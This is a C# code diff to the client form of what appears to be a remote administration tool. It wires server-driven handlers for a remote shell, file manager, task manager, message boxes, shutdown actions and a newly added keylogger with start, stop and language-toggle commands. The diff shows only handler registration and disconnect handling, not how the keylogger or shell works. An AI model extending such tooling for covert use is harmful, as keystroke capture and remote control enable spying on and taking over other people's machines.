@@ -23,6 +23,9 @@ namespace Client
         private RemoteShellHandler? _remoteShellHandler;
         private FileManagerHandler? _fileManagerHandler;
         private TaskManagerHandler? _taskManagerHandler;
+        private MessageBoxHandler? _messageBoxHandler;
+        private ShutdownActionHandler? _shutdownActionHandler;
+        private KeyLoggerHandler? _keyLoggerHandler;
 
 		public MainClientForm()
         {
@@ -36,20 +39,40 @@ namespace Client
             var sysService = new SystemInfoService();
             var remoteShellService = new RemoteShellService();
             var fileManagerService = new FileManagerService();
+            var messageBoxService = new MessageBoxService();
             var taskManagerService = new TaskManagerService();
-
-			_systemInfoHandler = new SystemInfoHandler(sysService, _connection);
+            var shutdownActionService = new ShutdownActionService();
+            var keyLoggerService = new KeyLoggerService(_connection);
+            _systemInfoHandler = new SystemInfoHandler(sysService, _connection);
             _remoteShellHandler = new RemoteShellHandler(remoteShellService, _connection);
             _fileManagerHandler = new FileManagerHandler(fileManagerService, _connection);
-			_taskManagerHandler = new TaskManagerHandler(taskManagerService, _connection);
-
-			_packetHandler = new PacketHandler(
+            _messageBoxHandler = new MessageBoxHandler(messageBoxService, _connection);
+            _taskManagerHandler = new TaskManagerHandler(taskManagerService, _connection);
+            _shutdownActionHandler = new ShutdownActionHandler(shutdownActionService, _connection);
+            _keyLoggerHandler = new KeyLoggerHandler(keyLoggerService);
+            _packetHandler = new PacketHandler(
                onSystemInfoRequest: req => _ = _systemInfoHandler!.HandleAsync(req),
                onRemoteShellRequest: sreq => _ = _remoteShellHandler!.HandleAsync(sreq),
                onFileManagerRequest: freq => _ = _fileManagerHandler!.HandleAsync(freq),
-			   onTaskManagerRequest: treq => _ = _taskManagerHandler!.HandleAsync(treq)
-		   );
+               onMessageBoxRequest: mreq => _ = _messageBoxHandler!.HandleAsync(mreq),
+               onShutdownActionRequest: sdreq => _shutdownActionHandler!.HandleAsync(sdreq),
+               onKeyLoggerStart: kls => _ = _keyLoggerHandler!.HandleStartAsync(kls),
+               onKeyLoggerStop: klt => _ = _keyLoggerHandler!.HandleStopAsync(klt),
+               onKeyLoggerLangToggle: l => _ = _keyLoggerHandler!.HandleLangToggleAsync(l),
+               onTaskManagerRequest: treq => _ = _taskManagerHandler!.HandleAsync(treq)
+           );
             _connection.OnLineReceived += line => _packetHandler.HandleLine(line);
+            _connection.OnDisconnected += () =>
+            {
+                if (InvokeRequired)
+                {
+                    BeginInvoke(new Action(UpdateUiDisconnected));
+                }
+                else
+                {
+                    UpdateUiDisconnected();
+                }
+            };
         }
 
         private async void btnConnect_Click(object sender, EventArgs e)
@@ -89,6 +112,14 @@ namespace Client
                 return;
             }
             txtLog.AppendText(line + Environment.NewLine);
+        }
+
+        private void UpdateUiDisconnected()
+        {
+            lblStatus.ForeColor = Color.Red;
+            lblStatus.Text = "Disconnected";
+            btnConnect.Text = "Connect"; 
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] Disconnected by server");
         }
     }
 }
